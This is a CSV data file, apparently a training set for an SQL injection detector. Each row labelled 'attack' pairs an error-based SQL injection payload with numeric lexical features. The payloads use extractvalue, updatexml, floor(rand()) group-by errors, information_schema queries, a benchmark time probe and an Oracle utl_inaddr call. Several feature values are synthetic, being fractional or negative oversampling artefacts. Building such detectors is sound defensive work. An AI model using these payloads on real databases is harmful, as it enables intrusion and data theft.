id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000176,attack,error,"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000039,1.218744419159725,217.72862170175563,39.0,3.895153845065086,65.95538856359727,41.72862170175563,86.63568914912219,23.408922287280546,0.3028189109858223,0.19138863933696582,0.39820182391831355,0.10759062575889834,1.0,0.0,1.0,0.0,1.0,1.5910777127194538,0.0,14.817844574561093,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.591077712719454,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.5910777127194538,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.5910777127194535
SMOTE_000177,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000081,0.2192066070299363,233.07107796633267,32.93364842616662,3.91912942751652,81.0,44.46918740933296,82.66824213083311,24.93364842616662,0.3476154367662598,0.19070690258933454,0.35469054365596997,0.10698711698843574,2.13270314766676,0.0,0.0,0.0,1.1102230246251565e-16,1.93364842616662,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,3.80094527849986,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.93364842616662,0.0,0.9336484261666202,0.0,0.06635157383337986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.93364842616662
SMOTE_000178,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,0.27107594199666774,215.85766424916955,32.57299274750868,3.5107133379858095,57.43065699667824,32.0,97.28467150166088,29.14233575083044,0.26604817796792996,0.14824622618489608,0.45069542661906337,0.13501016922811065,0.0,4.0,0.0,0.0,1.0,1.14233575083044,0.0,18.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.1423357508304406,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000179,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000120,0.7588865734790998,317.59896877796825,40.0,4.019182976625068,104.37969063339047,63.0,115.75938126678093,34.45989687779682,0.3286719567886144,0.198498162382715,0.36432281672655425,0.10850706410211636,0.22994843889841166,0.7700515611015882,2.0,0.0,2.0,2.0,0.0,20.459896877796822,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.2299484388984117,0.7700515611015883,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000180,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,0.046047785388866225,283.2274361570679,38.0,4.002821960750838,107.07107379908372,35.113718078533964,105.04264427945023,36.0,0.3780419799370626,0.12396116561362058,0.37088513578349847,0.12711171866581839,3.97157048036651,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,2.0,5.0,4.02842951963349,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.014214759816745,0.0,0.014214759816745082,2.0,1.0,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.014214759816745
SMOTE_000181,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",nearest_attack_euclidean,R000063,0.06797121419602227,194.70826206008923,30.0,3.5867139624521522,45.12966130662702,39.0,82.67584673343245,27.902754020029736,0.23182829231012558,0.20031369670958152,0.42456587708938304,0.14329213389090986,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.9675846733432452,0.0,15.93516934668649,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,1.9675846733432447,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000182,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,1.0842642794107666,192.75426698748709,27.377133493743543,3.447272238253937,44.50853397497418,37.49146602502582,85.0,25.75426698748709,0.2307434900361665,0.194708222037248,0.4410170186126858,0.13353126931389972,2.754266987487089,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.0,0.6885667468717722,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000183,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000112,0.2000319274552019,224.50983586287828,32.0,3.4683373386288707,59.0,32.0,102.92486321906524,30.584972643813046,0.2631001862826367,0.1426984061193962,0.4580067964047132,0.13619461119325396,0.0,4.0,0.0,0.0,1.0,1.0,0.0,19.584972643813046,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000184,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000060,3.515711615322981,191.2533504452058,33.005360712329285,3.777194151009157,66.25603080137044,25.754690623288123,75.24262902054724,24.0,0.34624646217995175,0.13450231599837528,0.3937473192760573,0.1255039025456157,3.74932991095884,0.0,0.0,0.0,1.1102230246251565e-16,0.25067008904116017,0.0,15.247989732876519,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,0.752010267123481,1.0,0.0,0.0,0.2506700890411603,0.0,0.2506700890411603,1.0,0.0,0.0,1.0,0.2506700890411603,0.25067008904116017,0.0,0.2506700890411603,0.2506700890411603,0.7493299109588397,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5013401780823203
SMOTE_000185,attack,error,"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",nearest_attack_euclidean,R000080,1.2788057105898876,209.6349522488121,32.0,3.5573441208243217,56.03523574979719,33.27061325008692,92.29386749913081,28.035235749797188,0.26823779860082536,0.1609613645921023,0.4374268849457018,0.13337395186137052,0.0,4.0,0.0,0.0,0.5764622499710271,1.0,0.0,17.45877349982616,2.7755575615628914e-17,-1.1102230246251565e-16,4.423537750028973,1.5764622499710272,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.152924499942054,0.0,0.0,0.5764622499710272,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.729386749913082
SMOTE_000186,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000111,0.7431463541434712,252.75921717852248,35.176267302908236,3.989628413392448,96.82027684653183,35.0,90.58640572617415,30.35253460581648,0.38272818538355985,0.13868661875002514,0.3584290072023855,0.12015618866402952,0.17626730290823933,0.0,0.0,0.0,2.0,1.0,0.0,18.17626730290824,2.7755575615628914e-17,2.0,5.823732697091761,3.0,0.17626730290823933,0.0,0.0,0.17626730290823933,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.17626730290823933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.17626730290824
SMOTE_000187,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000023,0.6322743999157916,200.01689509460343,29.471582064388436,3.5712084068501615,55.0,32.0,85.60214890143811,27.41474619316531,0.276296800557633,0.16075450214262282,0.426075725401052,0.13687297189869216,4.0,0.0,0.0,0.0,1.0,2.0,0.0,15.41474619316531,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000188,attack,error,"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000029,0.06102466095614933,285.8374926574795,40.90713866141685,4.067560990570557,106.88392332677107,43.0,102.95356933070842,33.0,0.37392774340309065,0.1504372235472389,0.3601832103273708,0.11545182272229963,0.0,0.0,2.0,0.0,2.0,2.0,0.0,19.0,2.7755575615628914e-17,2.0,5.0,6.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,2.0,0.023215334645787178,0.9767846653542128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000189,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000111,0.7141024353535329,252.57321570456514,35.169378359428336,3.989667546225241,96.71005375085342,35.0,90.52440523485504,30.338756718856676,0.38258373979446514,0.1387820740519094,0.358446280066536,0.12018790608708947,0.16937835942833823,0.0,0.0,0.0,2.0,1.0,0.0,18.16937835942834,2.7755575615628914e-17,2.0,5.830621640571661,3.0,0.16937835942833834,0.0,0.0,0.16937835942833834,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.16937835942833834,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.169378359428338
SMOTE_000190,attack,error,"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000108,0.31893123022601005,206.08810562866145,40.0,3.8829283225800593,63.0,37.0,83.0,23.08810562866146,0.30569507399733425,0.17953520218891061,0.4027411292345832,0.11202859457917187,0.9118943713385431,0.08810562866145688,1.0,0.0,1.0,1.0,0.0,15.0,0.08810562866145692,-1.1102230246251565e-16,3.0,3.0,0.9118943713385432,0.08810562866145683,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000191,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000050,0.18149592138851936,315.34522353691864,38.234522353691865,4.054904007144888,113.0,55.0,112.87617882953492,34.46904470738373,0.35840106964785207,0.17444299850116693,0.35786629107158785,0.1092896407793932,4.0,0.0,0.0,0.0,2.0,1.0,0.0,20.46904470738373,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000192,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,0.04555029580614225,282.8399549489874,37.96443443310831,4.002908427683047,107.01778278344585,35.0,104.85773773243324,35.96443443310831,0.3783776192021553,0.12374715092189319,0.37072224740959653,0.12715298246635506,4.0,0.0,0.0,0.0,2.0,2.0,0.0,19.96443443310831,2.7755575615628914e-17,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.017782783445845,0.9822172165541548,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000193,attack,error,"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",nearest_attack_euclidean,R000140,2.0281676110783926,210.0,33.1395343658653,3.99688632840461,81.0,37.0,70.0,22.0,0.38571428571428573,0.1761904761904762,0.3333333333333333,0.10476190476190476,1.7209312682693971,2.279068731730603,0.0,0.0,1.1102230246251565e-16,1.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.0,0.43023281706734934,0.5697671829326507,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000194,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000040,0.11736857099877737,206.0,39.43638377416197,3.8675810581191126,63.0,37.0,83.0,23.0,0.3058252427184466,0.1796116504854369,0.4029126213592233,0.11165048543689321,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000195,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""uquh""  =  ""uquh",nearest_attack_euclidean,R000122,2.0531694542595536,207.09929482086844,30.302009877173795,3.711599616627319,59.73286321391229,38.07919604913048,82.8268335823909,26.46040197543476,0.2834035825921516,0.18686414037989257,0.4005455771065349,0.12918669992142098,0.0,4.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,14.920803950869518,2.7755575615628914e-17,-1.1102230246251565e-16,5.539598024565241,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.539598024565241,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.46040197543475914,0.46040197543475914,4.46040197543476
SMOTE_000196,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000075,0.6278579052927804,309.3817289999495,37.83553313636134,4.017790945824814,108.19086449997474,55.0,112.01319881816804,34.177665681806694,0.34959048778035035,0.17790372413076844,0.36212021840620434,0.11038556968267695,3.342132545445355,0.0,0.0,0.0,2.0,1.8355331363613387,0.0,20.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.835533136361339,0.8355331363613387,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.835533136361339,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.835533136361338
SMOTE_000197,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000107,0.16225507219163113,214.67672562057808,33.935345124115614,3.9625188139663536,70.45043355498274,44.83836281028904,76.29094694147973,23.09698231382658,0.32807250584821884,0.20884391040921452,0.355465058315467,0.10761852542709968,0.0,1.0,2.0,0.0,0.03232743794219228,2.0,0.0,13.064654875884383,2.7755575615628914e-17,-1.1102230246251565e-16,4.967672562057808,4.032327437942192,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0646548758843841,0.0,1.0,0.03232743794219206,0.0,0.03232743794219217,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9676725620578079,0.9676725620578079,5.064654875884385
SMOTE_000198,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000027,1.2717204276984122,327.88786619038245,35.22196654759561,3.6457505890162634,90.44393309519123,48.0,133.8329498213934,55.61098327379781,0.27580610557175567,0.1464123392184453,0.408171545604179,0.16961000960562006,0.0,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,22.999999999999996,0.0,0.0,0.0,0.6109832737978078,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000199,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000125,0.10020838784834876,321.7051440716642,38.87051440716642,4.008351602080561,113.0,55.0,117.96411525733134,35.741028814332836,0.35129248281290565,0.17098306685583903,0.3666356450962916,0.1110888052349637,4.0,0.0,0.0,0.0,2.0,1.0,0.0,21.741028814332836,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
